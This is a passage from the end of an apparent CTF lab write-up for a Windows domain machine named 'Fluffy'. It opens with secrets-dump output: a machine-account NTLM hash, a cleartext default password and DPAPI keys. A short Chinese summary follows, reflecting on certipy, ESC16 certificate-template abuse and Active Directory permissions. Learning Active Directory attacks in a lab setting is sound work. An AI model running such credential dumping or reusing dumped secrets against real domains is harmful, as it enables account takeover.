2b3a5c8bcd8fc666b876709496e61a026559328d19db45819e69695bbafda526692513d2457e98de68b9473b08ed96e1d50b06dc53c6e58a595feebd6568a2a75811a5456336f40ede98c2996a0360a618d492e112a905235641126ad3234d68a920c0cd9439b4bd7203d28a1ad4d2ebdbe484d47836735b4cb
FLUFFY\DC01$:aad3b435b51404eeaad3b435b51404ee:7a9950c26fe9c3cbfe5b9ceaa21c9bfd:::                           [*] DefaultPassword                                                
p.agila:prometheusx-303                                            
[*] DPAPI_SYSTEM                                                   
dpapi_machinekey:0x50f64bc1be95364da6cc33deca194d9b827c4846                                                 dpapi_userkey:0xe410025a604608d81064e274f6eb46cba458ebd5 
```

## Sum

提权时候遇到了certipy这个工具的利用，以及ESC16的原理。模板利用的原理我还不是很清除。之前对于generic等权限的理解也不全。花佬给我发了一张图片，感觉讲的很详细，里面标注了拥有何种权限时候的利用方式。以后在遇到不会的地方时候可以回来看一看。

![eeac22e31aa9a743e0e9bfc5855f077](https://raw.githubusercontent.com/Enchanter-W/Pics/master/eeac22e31aa9a743e0e9bfc5855f077.png)